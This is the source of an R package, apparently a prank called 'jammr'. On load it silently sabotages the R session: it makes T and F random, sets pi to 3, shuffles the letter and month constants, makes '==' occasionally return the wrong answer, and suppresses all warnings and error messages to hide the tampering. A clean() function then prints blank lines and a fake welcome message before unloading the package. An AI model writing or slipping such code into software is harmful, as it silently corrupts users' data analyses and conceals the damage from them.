.onLoad <- function(libname, pkgname){
  ## Stochastic T/F - impossible to debug
  tf <- function() {
    runif(1) < 0.5
  }
  ## variables can't be deleted from baseenv (and active bindings
  ## can't replace non-active ones) but can be assigned into Autoloads
  ## without having to mess about with unlocking :)
  makeActiveBinding(quote(T), tf, as.environment("Autoloads"))
  makeActiveBinding(quote(F), tf, as.environment("Autoloads"))

  ## Rather than assign globally, replace the original bindings,
  ## leaving less trace.
  replace <- function(name, value) {
    sym <- as.symbol(name)
    unlockBinding(sym, baseenv())
    assign(name, value, envir=baseenv())
    lockBinding(sym, baseenv())
  }
  replace("pi", 3)
  replace("letters", sample(LETTERS))
  replace("LETTERS", sample(letters))
  replace("month.name", sample(month.name))
  replace("month.abb", sample(month.abb))
  replace("==", function(e1, e2) {
    if (runif(1) < 0.001) {
      !(.Primitive("==")(e1, e2))
    } else {
      .Primitive("==")(e1, e2)
    }
  })
  options(showWarnCalls = FALSE,
          showErrorCalls = FALSE,
          show.error.messages = FALSE,
          warn = -1)
}

#'@title clean up the sabotage
#'@description prints a ton of newlines, a facsimile of the R welcome message, and then
#'unloads \code{jammr}.
#'@useDynLib jammr
#'@export
clean <- function(){
  cat(rep("\n",120))
  .Call("greet","")
  detach("package:jammr", unload = TRUE)
  return(invisible())
}
